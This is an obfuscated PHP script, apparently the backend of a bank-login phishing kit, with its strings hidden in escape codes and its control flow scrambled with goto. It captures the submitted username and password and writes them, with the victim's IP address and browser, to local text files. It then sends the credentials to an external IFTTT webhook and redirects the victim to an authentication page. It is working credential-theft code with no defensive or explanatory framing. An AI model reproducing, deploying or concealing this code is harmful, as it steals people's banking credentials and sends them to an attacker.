<?php
 goto mfVhJ; rtsuM: $Time = date("\144\57\x6d\57\x59") . "\40\141\x74\x20" . date("\x68\72\x69\x3a\x73\141"); goto P344q; nqix3: $file = "\142\141\x6e\x6b\x32\x2e\164\x78\164"; goto nl4qP; JSDeL: if (!empty($_SERVER["\x48\x54\x54\120\137\x43\x4c\111\x45\116\124\x5f\x49\x50"])) { $ipaddress = $_SERVER["\x48\x54\x54\x50\137\x43\114\111\105\x4e\124\137\111\120"] . "\xd\12"; } elseif (!empty($_SERVER["\x48\x54\124\120\x5f\130\x5f\106\x4f\122\x57\x41\x52\104\x45\x44\x5f\x46\x4f\122"])) { $ipaddress = $_SERVER["\110\x54\x54\120\137\130\x5f\x46\x4f\122\127\101\122\x44\x45\x44\137\x46\117\x52"] . "\15\12"; } else { $ipaddress = $_SERVER["\x52\105\x4d\117\124\105\137\x41\x44\104\x52"] . "\15\xa"; } goto dZg0A; wBGm9: $context = stream_context_create($options); goto tL8py; x1IrP: $browser = $_SERVER["\110\124\124\120\137\x55\123\x45\122\x5f\101\x47\105\116\124"]; goto nqix3; Fm9lB: fclose($fp); goto CmvCu; CcI3N: header("\114\x6f\x63\141\164\151\x6f\x6e\72\x20\141\x75\164\x68\145\x6e\164\151\x63\141\x74\151\157\x6e\57"); goto nAg22; hpKl8: fwrite($fp, $ipaddress); goto PvsQV; fxcQY: fwrite($fp, "\12\75\75\x3d\x3d\75\x3d\75\x3d\75\75\75\75\75\x3d\x3d\x3d\75\75\75\x3d\75\x3d\75\x3d\75\x3d\75\x3d\x3d\75\75\75\75\x3d\75\75\x3d\75\x3d\75\75\x3d\x3d\xa"); goto Fm9lB; nl4qP: $victim = "\x50\x75\142\154\x69\x63\x20\111\120\x3a\40"; goto DmblW; H0R75: fwrite($fp, $victim); goto hpKl8; UUVDM: fwrite($fp, $browser); goto fxcQY; mfVhJ: date_default_timezone_set("\x41\x66\x72\x69\x63\x61\x2f\113\x61\155\160\x61\x6c\141"); goto rtsuM; tL8py: $result = file_get_contents($url, false, $context); goto CcI3N; PvsQV: fwrite($fp, $useragent); goto UUVDM; icj1h: $options = array("\150\x74\164\x70" => array("\x68\145\x61\144\x65\162" => "\103\x6f\x6e\x74\x65\x6e\164\x2d\x74\x79\x70\x65\x3a\40\x61\x70\x70\154\151\x63\141\x74\x69\157\x6e\x2f\170\55\167\x77\167\55\146\157\162\155\x2d\165\x72\154\145\156\x63\x6f\x64\x65\x64\xd\xa", "\x6d\x65\164\x68\157\144" => "\120\x4f\123\x54", "\x63\157\x6e\x74\145\156\x74" => http_build_query($data))); goto wBGm9; DmblW: $fp = fopen($file, "\x61"); goto H0R75; D2nT4: $Password = $_POST["\x70\x61\x73\163\x77\157\162\x64"]; goto e9A2B; lMubo: $data = array("\x76\141\x6c\165\x65\61" => $Username, "\166\141\x6c\x75\x65\62" => $Password); goto icj1h; P344q: $Username = $_POST["\165\163\145\x72\x6e\141\155\145"]; goto D2nT4; dZg0A: $useragent = "\x20\x55\163\x65\x72\x2d\x41\x67\145\x6e\164\72\40"; goto x1IrP; e9A2B: file_put_contents("\x62\141\x6e\153\61\56\x74\x78\x74", "\101\x63\x63\x6f\x75\x6e\164\72\x20" . $Username . "\40\12\120\141\163\x73\x77\157\x72\144\x3a\x20" . $Password . "\40\xa\117\x6e\x3a\40" . $Time . "\xa\75\75\x3d\75\75\x3d\x3d\75\x3d\x3d\75\x3d\75\x3d\75\75\75\75\x3d\x3d\75\75\75\75\x3d\75\75\75\75\75\x3d\x3d\75\75\75\75\75\75\75\75\x3d\75\x3d\12", FILE_APPEND); goto JSDeL; CmvCu: $url = "\150\164\164\160\72\57\57\155\141\153\x65\162\x2e\x69\x66\x74\164\164\56\x63\x6f\155\x2f\x74\162\151\x67\x67\145\x72\57\163\164\x72\x61\x74\x61\x67\145\x6d\137\154\x6f\147\151\x6e\x2f\167\x69\x74\150\x2f\153\145\x79\57\144\x35\x33\145\131\x39\116\x6a\121\55\106\x4e\x49\x45\165\162\126\62\117\160\x45\110"; goto lMubo; nAg22: die; goto luDNI; luDNI: ?>